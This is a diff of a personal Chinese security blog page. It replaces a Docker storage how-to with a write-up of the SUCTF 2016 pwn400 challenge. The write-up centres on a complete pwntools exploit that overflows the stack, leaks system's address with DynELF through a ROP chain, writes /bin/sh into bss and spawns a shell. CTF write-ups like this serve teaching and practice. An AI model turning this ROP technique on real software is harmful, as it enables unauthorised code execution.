@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="docker,ics," />
+  <meta name="keywords" content="CTF,pwn,栈溢出," />
 
 
 
@@ -89,23 +89,19 @@
 
 
 
-<meta name="description" content="在如前安装完docker后，会有如下界面：之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。">
+<meta name="description" content="SUCTF-2016-pwn400-writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="win下Docker默认存储位置修改">
-<meta property="og:url" content="http://yoursite.com/2017/02/14/win下Docker默认存储位置修改/index.html">
+<meta property="og:title" content="SUCTF-2016-pwn400-writeup">
+<meta property="og:url" content="http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="在如前安装完docker后，会有如下界面：之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerok.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerstop.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerdisk2.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerdisk4.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerdisk5.jpg">
-<meta property="og:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerdisk6.jpg">
-<meta property="og:updated_time" content="2017-02-14T12:55:39.015Z">
+<meta property="og:description" content="SUCTF-2016-pwn400-writeup">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/1.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/2.gif?raw=true">
+<meta property="og:updated_time" content="2017-06-28T07:33:51.241Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="win下Docker默认存储位置修改">
-<meta name="twitter:description" content="在如前安装完docker后，会有如下界面：之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。">
-<meta name="twitter:image" content="http://ojp0pjljj.bkt.clouddn.com/dockerok.jpg">
+<meta name="twitter:title" content="SUCTF-2016-pwn400-writeup">
+<meta name="twitter:description" content="SUCTF-2016-pwn400-writeup">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/1.jpg?raw=true">
 
 
 
@@ -133,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/02/14/win下Docker默认存储位置修改/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/"/>
 
 
 
 
 
-  <title> win下Docker默认存储位置修改 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> SUCTF-2016-pwn400-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -305,7 +301,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/14/win下Docker默认存储位置修改/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -329,7 +325,7 @@
             
             
               
-                win下Docker默认存储位置修改
+                SUCTF-2016-pwn400-writeup
               
             
           </h1>
@@ -344,8 +340,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-14T20:09:11+08:00">
-                2017-02-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-28T14:57:33+08:00">
+                2017-06-28
               </time>
             
 
@@ -367,8 +363,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/杂谈/" itemprop="url" rel="index">
-                    <span itemprop="name">杂谈</span>
+                  <a href="/categories/二进制安全/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制安全</span>
                   </a>
                 </span>
 
@@ -386,7 +382,7 @@
 
           
           
-             <span id="/2017/02/14/win下Docker默认存储位置修改/" class="leancloud_visitors" data-flag-title="win下Docker默认存储位置修改">
+             <span id="/2017/06/28/SUCTF-2016-pwn400-writeup/" class="leancloud_visitors" data-flag-title="SUCTF-2016-pwn400-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -413,23 +409,53 @@
       
 
       
-        <p>在如前安装完docker后，会有如下界面：<br><img src="http://ojp0pjljj.bkt.clouddn.com/dockerok.jpg" alt=""><br>之后我们会通过一系列的命令来建造容器，而所需要的镜像则会被默认存放在C盘中的 虚拟机磁盘文件disk.vmdk中，所以为防止以后镜像过多而导致的C盘空间不足，要想办法修改一下存储的位置。<br><a id="more"></a></p>
-<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>先停掉 docker-machine,命令行中输入</p>
-<pre><code>docker-machine stop default
-</code></pre><p><img src="http://ojp0pjljj.bkt.clouddn.com/dockerstop.jpg" alt=""></p>
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>在virturalbox界面同时按下 ctrl+D 调出虚拟介质管理器。</p>
-<p><img src="http://ojp0pjljj.bkt.clouddn.com/dockerdisk2.jpg" alt=""></p>
-<p>红箭头所指即为docker-machine的虚拟磁盘文件地址。点击右上角的复制，根据提示操作，为保持一致性，在选择磁盘时选择 vmdk磁盘，并选择你要作为磁盘存放路径的目录。这里我将其复制到了 D:\virtualboxVM\docker-machine\disk.vmdk</p>
-<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>返回virtualbox界面，按下 ctrl+s 跳出关于虚拟机 default 的设置界面。<br><img src="http://ojp0pjljj.bkt.clouddn.com/dockerdisk4.jpg" alt=""><br>先移除掉原本的 disk.vmdk 再点选控制器，选择出现的两个按钮中的右边那个：添加虚拟硬盘<br><img src="http://ojp0pjljj.bkt.clouddn.com/dockerdisk5.jpg" alt=""><br>选择“使用现有的虚拟盘”，将第二步中复制出来的硬盘文件导入。添加完成后，如下，可以发现disk的路径已经改变。<br><img src="http://ojp0pjljj.bkt.clouddn.com/dockerdisk6.jpg" alt=""></p>
-<h1 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h1><p>重启docker，命令行中输入：</p>
-<pre><code>docker-machine start default
-</code></pre><p>即可</p>
+        <p>SUCTF-2016-pwn400-writeup<br><a id="more"></a><br>IDA看，程序流程简单，有明显栈溢出漏洞。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/1.jpg?raw=true" alt=""></p>
+<p>无libc，无canary等保护。基本的思路如下：</p>
+<ul>
+<li>构造ROP链</li>
+<li>泄露system地址</li>
+<li>往bss段写入/bin/sh</li>
+<li>调用system</li>
+</ul>
+<p>最后的exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./simple"</span>)</div><div class="line">elf = ELF(<span class="string">"./simple"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">40</span></div><div class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006c3</span></div><div class="line">pop_rsi_pop_r15_ret = <span class="number">0x00000000004006c1</span></div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</div><div class="line">bss_addr = elf.bss() + <span class="number">0x18</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">"leak address =&gt; &#123;&#125;"</span>.format(hex(address)))</div><div class="line">	p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(pop_rdi_ret_addr)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(pop_rsi_pop_r15_ret)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(write_plt)</div><div class="line">	payload += p64(main_addr)</div><div class="line">	p.sendline(payload)</div><div class="line">	address = p.recv(<span class="number">8</span>)</div><div class="line">	<span class="keyword">return</span> address</div><div class="line">d = DynELF(leak,elf = elf)</div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(start_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_ret)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(read_plt)</div><div class="line">payload += p64(main_addr)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh\x00'</span></div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(<span class="string">'luck!\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170628/2.gif?raw=true" alt=""></p>
 
       
     </div>
 	<div>
       
         
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/06/28/SUCTF-2016-pwn400-writeup/">SUCTF-2016-pwn400-writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2017年06月28日 - 14:06</p>
+  <p><span>最后更新:</span>2017年06月28日 - 15:06</p>
+  <p><span>原始链接:</span><a href="/2017/06/28/SUCTF-2016-pwn400-writeup/" title="SUCTF-2016-pwn400-writeup">http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/06/28/SUCTF-2016-pwn400-writeup/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
 
       
 	</div>
@@ -468,9 +494,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/docker/" rel="tag"># docker</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
-            <a href="/tags/ics/" rel="tag"># ics</a>
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
           
         </div>
       
@@ -479,8 +507,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/13/windows平台下Docker环境搭建/" rel="next" title="windows平台下Docker环境搭建">
-                <i class="fa fa-chevron-left"></i> windows平台下Docker环境搭建
+              <a href="/2017/06/27/pico-ctf-2013-pwn-writeup/" rel="next" title="pico-ctf-2013-pwn-writeup">
+                <i class="fa fa-chevron-left"></i> pico-ctf-2013-pwn-writeup
               </a>
             
           </div>
@@ -489,8 +517,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/02/16/栈溢出学习之bypass-ASLR-利用DynELF模块leak出内存地址/" rel="prev" title="栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址">
-                栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址 <i class="fa fa-chevron-right"></i>
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -540,17 +568,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview sidebar-panel">
+      <section class="site-overview sidebar-panel sidebar-panel-active">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -646,22 +665,6 @@
 
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一步"><span class="nav-number">1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二步"><span class="nav-number">2.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三步"><span class="nav-number">3.</span> <span class="nav-text">第三步</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第四步"><span class="nav-number"></span> <span class="nav-text">第四步</span></a></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
     </div>
